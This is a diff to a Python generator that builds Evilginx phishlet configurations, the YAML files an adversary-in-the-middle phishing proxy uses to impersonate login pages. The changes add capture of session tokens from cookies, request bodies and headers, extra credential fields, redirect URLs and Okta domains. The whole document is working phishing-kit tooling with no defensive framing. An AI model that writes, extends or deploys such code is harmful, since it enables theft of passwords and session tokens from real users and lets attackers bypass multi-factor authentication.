+    # ──────────────────────────────────────────────────────────────────────
+
     def _serialize_to_yaml(self, phishlet: Phishlet) -> str:
         yaml = YAML()
         yaml.default_flow_style = False
@@ -593,6 +985,18 @@ class PhishletGenerator:
         doc["author"] = SQ(phishlet.author)
         doc["min_ver"] = SQ(phishlet.min_ver)
 
+        # params
+        if phishlet.params:
+            p_seq = CommentedSeq()
+            for p in phishlet.params:
+                entry = CommentedMap()
+                entry["name"] = SQ(p.name)
+                entry["default"] = SQ(p.default)
+                if p.required:
+                    entry["required"] = p.required
+                p_seq.append(entry)
+            doc["params"] = p_seq
+
         # proxy_hosts (flow-style per item)
         ph_seq = CommentedSeq()
         for host in phishlet.proxy_hosts:
@@ -603,6 +1007,8 @@ class PhishletGenerator:
             entry["domain"] = SQ(host.domain)
             entry["session"] = host.session
             entry["is_landing"] = host.is_landing
+            if not host.auto_filter:
+                entry["auto_filter"] = host.auto_filter
             ph_seq.append(entry)
         doc["proxy_hosts"] = ph_seq
 
@@ -618,6 +1024,8 @@ class PhishletGenerator:
                 entry["search"] = SQ(sf.search)
                 entry["replace"] = SQ(sf.replace)
                 entry["mimes"] = sf.mimes
+                if sf.redirect_only:
+                    entry["redirect_only"] = sf.redirect_only
                 sf_seq.append(entry)
             doc["sub_filters"] = sf_seq
 
@@ -626,7 +1034,16 @@ class PhishletGenerator:
         for at in phishlet.auth_tokens:
             entry = CommentedMap()
             entry["domain"] = SQ(at.domain)
-            entry["keys"] = [SQ(k) for k in at.keys]
+            if isinstance(at, AuthTokenCookie):
+                entry["keys"] = [SQ(k) for k in at.keys]
+            elif isinstance(at, AuthTokenBody):
+                entry["path"] = SQ(at.path)
+                entry["name"] = SQ(at.name)
+                entry["search"] = SQ(at.search)
+            elif isinstance(at, AuthTokenHeader):
+                entry["path"] = SQ(at.path)
+                entry["name"] = SQ(at.name)
+                entry["header"] = SQ(at.header)
             at_seq.append(entry)
         doc["auth_tokens"] = at_seq
 
@@ -644,6 +1061,15 @@ class PhishletGenerator:
             p["search"] = SQ(phishlet.credentials.password.search)
             p["type"] = SQ(phishlet.credentials.password.type)
             creds_map["password"] = p
+        if phishlet.credentials.custom:
+            c_seq = CommentedSeq()
+            for c in phishlet.credentials.custom:
+                ce = CommentedMap()
+                ce["key"] = SQ(c.key)
+                ce["search"] = SQ(c.search)
+                ce["type"] = SQ(c.type)
+                c_seq.append(ce)
+            creds_map["custom"] = c_seq
         doc["credentials"] = creds_map
 
         # auth_urls
@@ -656,7 +1082,7 @@ class PhishletGenerator:
         login_map["path"] = SQ(phishlet.login.path)
         doc["login"] = login_map
 
-        # force_post
+        # force_post (ALWAYS includes 'force' field)
         if phishlet.force_post:
             fp_seq = CommentedSeq()
             for fp in phishlet.force_post:
@@ -670,15 +1096,14 @@ class PhishletGenerator:
                     s_entry["search"] = SQ(s.search)
                     search_seq.append(s_entry)
                 entry["search"] = search_seq
-                # Serialize force field (required by Evilginx)
+                # 'force' field — always present, required by Evilginx
                 force_seq = CommentedSeq()
-                if fp.force:
-                    for f in fp.force:
-                        f_entry = CommentedMap()
-                        f_entry.fa.set_flow_style()
-                        f_entry["key"] = SQ(f.key)
-                        f_entry["value"] = SQ(f.value)
-                        force_seq.append(f_entry)
+                for f in fp.force:
+                    f_entry = CommentedMap()
+                    f_entry.fa.set_flow_style()
+                    f_entry["key"] = SQ(f.key)
+                    f_entry["value"] = SQ(f.value)
+                    force_seq.append(f_entry)
                 entry["force"] = force_seq
                 entry["type"] = SQ(fp.type)
                 fp_seq.append(entry)
@@ -696,9 +1121,17 @@ class PhishletGenerator:
                 ji_seq.append(entry)
             doc["js_inject"] = ji_seq
 
+        # redirect_url
+        if phishlet.redirect_url:
+            doc["redirect_url"] = SQ(phishlet.redirect_url)
+
         stream = StringIO()
         yaml.dump(doc, stream)
         return stream.getvalue()
+
+    # ──────────────────────────────────────────────────────────────────────
+    # Helpers
+    # ──────────────────────────────────────────────────────────────────────
 
     @staticmethod
     def _extract_base_domain(hostname: str) -> str:
@@ -706,7 +1139,10 @@ class PhishletGenerator:
         parts = hostname.split(".")
         if len(parts) <= 2:
             return hostname
-        known_two_part = ["co.uk", "com.br", "com.au", "co.jp", "co.kr", "org.uk", "net.au"]
+        known_two_part = [
+            "co.uk", "com.br", "com.au", "co.jp", "co.kr",
+            "org.uk", "net.au", "okta.com", "oktapreview.com",
+        ]
         suffix = ".".join(parts[-2:])
         if suffix in known_two_part:
             return ".".join(parts[-3:])
